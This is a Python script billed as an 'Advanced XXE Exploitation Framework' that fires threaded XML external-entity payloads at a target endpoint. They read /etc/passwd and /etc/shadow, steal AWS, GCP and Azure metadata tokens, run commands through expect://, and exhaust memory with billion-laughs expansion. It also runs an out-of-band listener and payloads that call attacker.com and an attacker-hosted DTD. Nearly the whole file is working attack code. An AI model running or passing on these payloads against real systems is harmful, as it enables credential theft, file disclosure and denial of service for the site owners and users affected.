import requests
import time
import re
import threading
import urllib.parse
import base64
import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back
import argparse
import json
import os
from pathlib import Path

init(autoreset=True)

class AdvancedXXEScanner:
    def __init__(self, target, threads=10, timeout=15, verbose=False, output=None):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.output = output
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        
        
        self.payloads = {
            'file_read': [
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>', 'type': 'LFI-Linux', 'indicators': ['root:', 'daemon:', 'bin:']},
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><x>&xxe;</x>', 'type': 'LFI-Windows', 'indicators': ['[extensions]', '[fonts]']},
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///proc/version">]><x>&xxe;</x>', 'type': 'Linux-Version', 'indicators': ['linux', 'gnu']},
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><x>&xxe;</x>', 'type': 'Shadow', 'indicators': ['root:']},
            ],
            'cloud_metadata': [
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&xxe;</x>', 'type': 'AWS-Metadata', 'indicators': ['ami-id', 'instance-id']},
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]><x>&xxe;</x>', 'type': 'GCP-Token', 'indicators': ['access_token']},
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token">]><x>&xxe;</x>', 'type': 'Azure-Token', 'indicators': ['access_token']},
            ],
            'oob': [
                {'payload': self._generate_oob_payload(), 'type': 'OOB-DNS', 'indicators': []},
                {'payload': self._generate_http_oob_payload(), 'type': 'OOB-HTTP', 'indicators': []},
            ],
            'dos': [
                {'payload': self._generate_billion_laughs(), 'type': 'BillionLaughs', 'indicators': []},
                {'payload': self._generate_quadratic_blowup(), 'type': 'QuadraticBlowup', 'indicators': []},
            ],
            'blind': [
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % d SYSTEM "http://YOUR_IP:8000/evil.dtd">%d;]><x/>', 'type': 'Blind-XXE', 'indicators': []},
            ],
            'php_wrapper': [
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><x>&xxe;</x>', 'type': 'PHP-B64', 'indicators': ['cm9vdA==']},  # root base64
                {'payload': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "expect://id">]><x>&xxe;</x>', 'type': 'PHP-Expect', 'indicators': ['uid=']},
            ]
        }
        
        self.results = []
        self.oob_server = None
        self.listener_thread = None
        
    def _generate_oob_payload(self):
        return f'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{self._get_local_ip()}.attacker.com/">]><x>&xxe;</x>'
    
    def _generate_http_oob_payload(self):
        return f'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://{self._get_local_ip()}:8080/pwned"> %xxe; ]><x/>'
    
    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except:
            return "127.0.0.1"
    
    def _generate_billion_laughs(self):
        lol = "lol" + "".join([f";lol{l}" for l in range(9)])
        return f'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol1;</lolz>'
    
    def _generate_quadratic_blowup(self):
        return '''<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>'''
    
    def start_oob_listener(self, port=8080):
        """Start HTTP listener for OOB exfiltration"""
        self.oob_server = threading.Thread(target=self._http_listener, args=(port,), daemon=True)
        self.oob_server.start()
        print(f"{Fore.GREEN}[+] OOB listener started on port {port}{Style.RESET_ALL}")
    
    def _http_listener(self, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', port))
            s.listen(5)
            while True:
                conn, addr = s.accept()
                data = conn.recv(1024)
                print(f"{Fore.RED}[OOB HIT] {addr} -> {data.decode(errors='ignore')}{Style.RESET_ALL}")
                conn.close()
    
    def test_payload(self, payload_info):
        """Test single payload with advanced analysis"""
        headers = {
            "Content-Type": "application/xml; charset=utf-8",
            "Accept": "application/xml, text/xml, */*",
            "User-Agent": "Mozilla/5.0 (XXE-Scanner/1.0)"
        }
        
        start = time.time()
        try:
            r = self.session.post(self.target, data=payload_info['payload'], 
                                headers=headers, timeout=self.timeout)
            elapsed = time.time() - start
            
            result = {
                'type': payload_info['type'],
                'status': r.status_code,
                'time': elapsed,
                'length': len(r.text),
                'confirmed': False,
                'evidence': '',
                'response_snippet': r.text[:500]
            }
            
            body_lower = r.text.lower()
            
            
            if payload_info['indicators']:
                for indicator in payload_info['indicators']:
                    if indicator.lower() in body_lower:
                        result['confirmed'] = True
                        result['evidence'] = indicator
                        break
            
            
            if not payload_info['indicators']:
                if r.status_code >= 500 or elapsed > self.timeout * 0.8:
                    result['confirmed'] = True
                    result['evidence'] = f"HTTP {r.status_code} / {elapsed:.2f}s"
            
            self.results.append(result)
            return result
            
        except requests.exceptions.Timeout:
            self.results.append({'type': payload_info['type'], 'error': 'timeout'})
        except Exception as e:
            self.results.append({'type': payload_info['type'], 'error': str(e)})
    
    def run_full_scan(self):
        """Run comprehensive XXE scan"""
        print(f"{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.GREEN}🔥 ADVANCED XXE EXPLOITATION FRAMEWORK 🔥{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.YELLOW}Target: {self.target}{Style.RESET_ALL}")
        
        
        self.start_oob_listener(8080)
        time.sleep(1)
        
        all_payloads = []
        for category, plist in self.payloads.items():
            all_payloads.extend(plist)
        
        print(f"\n{Fore.CYAN}[*] Testing {len(all_payloads)} payloads with {self.threads} threads...{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_payload, p) for p in all_payloads]
            
            confirmed = []
            for future in as_completed(futures):
                result = future.result()
                if result.get('confirmed'):
                    confirmed.append(result)
                    self._print_confirmed(result)
        
        self._generate_report(confirmed)
    
    def _print_confirmed(self, result):
        sev_color = Fore.RED if 'Metadata' in result['type'] or 'Token' in result['type'] else Fore.MAGENTA
        print(f"\n{sev_color}{'='*50}{Style.RESET_ALL}")
        print(f"{sev_color}[!] CONFIRMED XXE: {result['type']}{Style.RESET_ALL}")
        print(f"    Status: {result['status']} | Time: {result['time']:.2f}s | Len: {result['length']}")
        if result['evidence']:
            print(f"    Evidence: {result['evidence']}")
        print(f"    Snippet: {result['response_snippet'][:200]}...")
    
    def _generate_report(self, confirmed):
        print(f"\n{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.WHITE}SCAN COMPLETE - RESULTS SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 80}")
        
        if confirmed:
            print(f"{Fore.RED}{Style.BRIGHT}[CRITICAL] XXE VULNERABILITY CONFIRMED{Style.RESET_ALL}")
            print(f"Confirmed vectors: {len(confirmed)}")
            
            impacts = []
            if any('Metadata' in r['type'] or 'Token' in r['type'] for r in confirmed):
                impacts.append("☠️  Cloud credential theft")
            if any('LFI' in r['type'] for r in confirmed):
                impacts.append("📁 Arbitrary file read")
            impacts.append("🌐 SSRF via external entities")
            impacts.append("💥 DoS via entity expansion")
            
            for impact in impacts:
                print(f"  {Fore.YELLOW}{impact}{Style.RESET_ALL}")
            
            
            if self.output:
                report = {
                    'target': self.target,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'confirmed': confirmed,
                    'recommendations': [
                        'Disable external entity processing',
                        'Use security manager to block file/URL access',
                        'Validate and sanitize XML input',
                        'Use JSON API instead of XML'
                    ]
                }
                with open(self.output, 'w') as f:
                    json.dump(report, f, indent=2)
                print(f"{Fore.GREEN}[+] Detailed report saved: {self.output}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[✓] No XXE vulnerabilities detected{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Advanced XXE Exploitation Framework')
    parser.add_argument('target', help='Target XML endpoint (POST)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-T', '--timeout', type=int, default=15, help='Request timeout (default: 15)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output report file')
    
    args = parser.parse_args()
    
    if not args.target.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[!] Invalid target URL{Style.RESET_ALL}")
        sys.exit(1)
    
    scanner = AdvancedXXEScanner(args.target, args.threads, args.timeout, args.verbose, args.output)
    scanner.run_full_scan()
    
    print(f"\n{Fore.CYAN}{'=' * 80}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()